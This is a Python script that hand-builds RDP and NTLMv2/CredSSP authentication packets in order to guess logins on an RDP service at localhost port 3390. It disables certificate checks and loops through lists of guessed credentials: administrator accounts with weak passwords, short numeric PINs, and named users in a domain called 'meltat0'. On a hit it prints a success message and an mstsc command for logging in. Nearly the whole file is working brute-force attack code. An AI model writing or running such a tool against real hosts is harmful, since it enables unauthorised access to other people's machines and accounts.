import socket
import struct
import ssl
import hmac
import os
import time

def md4(data):
    def left_rotate(x, n):
        return ((x << n) | (x >> (32 - n))) & 0xffffffff
    def F(x, y, z): return (x & y) | (~x & z)
    def G(x, y, z): return (x & y) | (x & z) | (y & z)
    def H(x, y, z): return x ^ y ^ z
    
    msg = bytearray(data)
    msg_len = len(data)
    msg.append(0x80)
    while len(msg) % 64 != 56: msg.append(0)
    msg += struct.pack('<Q', msg_len * 8)
    
    A, B, C, D = 0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476
    
    for i in range(0, len(msg), 64):
        X = struct.unpack('<16I', msg[i:i+64])
        AA, BB, CC, DD = A, B, C, D
        
        for j in range(16):
            A = left_rotate((A + F(B,C,D) + X[j]) & 0xffffffff, [3,7,11,19][j%4])
            A, B, C, D = D, A, B, C
        for j in range(16):
            k = [0,4,8,12,1,5,9,13,2,6,10,14,3,7,11,15][j]
            A = left_rotate((A + G(B,C,D) + X[k] + 0x5a827999) & 0xffffffff, [3,5,9,13][j%4])
            A, B, C, D = D, A, B, C
        for j in range(16):
            k = [0,8,4,12,2,10,6,14,1,9,5,13,3,11,7,15][j]
            A = left_rotate((A + H(B,C,D) + X[k] + 0x6ed9eba1) & 0xffffffff, [3,9,11,15][j%4])
            A, B, C, D = D, A, B, C
        
        A, B, C, D = (A+AA)&0xffffffff, (B+BB)&0xffffffff, (C+CC)&0xffffffff, (D+DD)&0xffffffff
    
    return struct.pack('<4I', A, B, C, D)

def ntlm_hash(p): return md4(p.encode('utf-16le'))

def ntlmv2_resp(nth, user, dom, schal, cchal, ts, ti):
    ud = (user.upper() + dom.upper()).encode('utf-16le')
    v2h = hmac.new(nth, ud, 'md5').digest()
    blob = b'\x01\x01\x00\x00\x00\x00\x00\x00' + ts + cchal + b'\x00\x00\x00\x00' + ti + b'\x00\x00\x00\x00'
    return hmac.new(v2h, schal + blob, 'md5').digest() + blob

def try_auth(host, port, user, pwd, dom=""):
    print(f"[*] {dom}\\{user}:{pwd}...", end=" ", flush=True)
    try:
        cookie = f"Cookie: mstshash={user}\r\n".encode()
        neg = bytes([0x01,0x00,0x08,0x00,0x03,0x00,0x00,0x00])
        x224 = bytes([0xe0,0,0,0,0,0]) + cookie + neg
        cr = bytes([0x03,0x00]) + struct.pack(">H", 5+len(x224)) + bytes([len(x224)]) + x224
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(15)
        sock.connect((host, port))
        sock.sendall(cr)
        if sock.recv(1024)[5] != 0xd0: print("REJECTED"); return False
        
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ss = ctx.wrap_socket(sock, server_hostname=host)
        
        ntlm_neg = b"NTLMSSP\x00\x01\x00\x00\x00\xb7\x82\x08\xe2" + b"\x00"*16 + b"\x0a\x00\x63\x45\x00\x00\x00\x0f"
        ss.send(bytes([0x30,0x37,0xa0,0x03,0x02,0x01,0x06,0xa1,0x30,0x30,0x2e,0x30,0x2c,0xa0,0x2a,0x04,0x28]) + ntlm_neg)
        cr = ss.recv(4096)
        
        if b"NTLMSSP" not in cr: print("NO CHAL"); return False
        nm = cr[cr.find(b"NTLMSSP"):]
        schal = nm[24:32]
        ti_len, ti_off = struct.unpack("<H", nm[40:42])[0], struct.unpack("<I", nm[44:48])[0]
        ti = nm[ti_off:ti_off+ti_len]
        
        ts = None
        i = 0
        while i < len(ti)-4:
            aid, alen = struct.unpack("<HH", ti[i:i+4])
            if aid == 7: ts = ti[i+4:i+12]; break
            if aid == 0: break
            i += 4 + alen
        if not ts: ts = struct.pack("<Q", int(time.time()*10000000)+116444736000000000)
        
        nth, cchal = ntlm_hash(pwd), os.urandom(8)
        ntr = ntlmv2_resp(nth, user, dom, schal, cchal, ts, ti)
        lmr = cchal + b'\x00'*16
        db, ub, wb = dom.encode('utf-16le'), user.encode('utf-16le'), b'W\x00I\x00N\x00'
        
        off = 88
        am = b'NTLMSSP\x00\x03\x00\x00\x00'
        for d in [(lmr,), (ntr,), (db,), (ub,), (wb,)]:
            am += struct.pack('<HHI', len(d[0]), len(d[0]), off); off += len(d[0])
        am += struct.pack('<HHI', 0, 0, off) + struct.pack('<I', 0xe2888215) + b'\x0a\x00\x63\x45\x00\x00\x00\x0f'
        am += lmr + ntr + db + ub + wb
        
        al = len(am)
        ca = bytes([0x30,0x82]) + struct.pack(">H", al+15) + bytes([0xa0,0x03,0x02,0x01,0x06,0xa2,0x82]) + struct.pack(">H", al+6)
        ca += bytes([0x30,0x82]) + struct.pack(">H", al+2) + bytes([0x04,0x82]) + struct.pack(">H", al) + am
        ss.send(ca)
        
        try:
            ar = ss.recv(4096)
            if ar and ar[0] == 0x30 and b'\xa3' in ar[:30]:
                print("SUCCESS!")
                return True
            elif ar and ar[0] == 0x30 and len(ar) > 50:
                print(f"GOT RESPONSE {len(ar)}b - POSSIBLE SUCCESS")
                return "maybe"
            else:
                print("AUTH FAIL")
        except ssl.SSLError:
            print("AUTH FAIL (SSL)")
        except:
            print("TIMEOUT")
        ss.close()
        return False
    except Exception as e:
        print(f"ERR: {str(e)[:40]}")
        return False

print("=== TRYING ADMINISTRATOR:1121 ===\n")

creds = [
    ("administrator", "1121", ""),
    ("Administrator", "1121", ""),
    ("ADMINISTRATOR", "1121", ""),
    ("administrator", "1121", "meltat0"),
    ("administrator", "1121", "MELTAT0"),
    ("admin", "1121", ""),
    ("Admin", "1121", ""),
]

for u, p, d in creds:
    r = try_auth("localhost", 3390, u, p, d)
    if r == True or r == "maybe":
        print(f"\n*** TRY: mstsc /v:localhost:3390 with {u}:{p} ***")
    time.sleep(0.3)

print("\n=== ALSO TRYING MORE VARIATIONS ===\n")

more_creds = [
    ("administrator", "", ""),
    ("administrator", "admin", ""),
    ("administrator", "password", ""),
    ("administrator", "Administrator", ""),
    ("administrator", "1234", ""),
    ("administrator", "12345", ""),
    ("administrator", "123456", ""),
    ("kuro", "1121", ""),
    ("Kuro", "1121", ""),
    ("melody", "0114", ""),
    ("melody", "0441", ""),
]

for u, p, d in more_creds:
    r = try_auth("localhost", 3390, u, p, d)
    if r == True or r == "maybe":
        print(f"\n*** FOUND: {u}:{p} ***")
        break
    time.sleep(0.2)
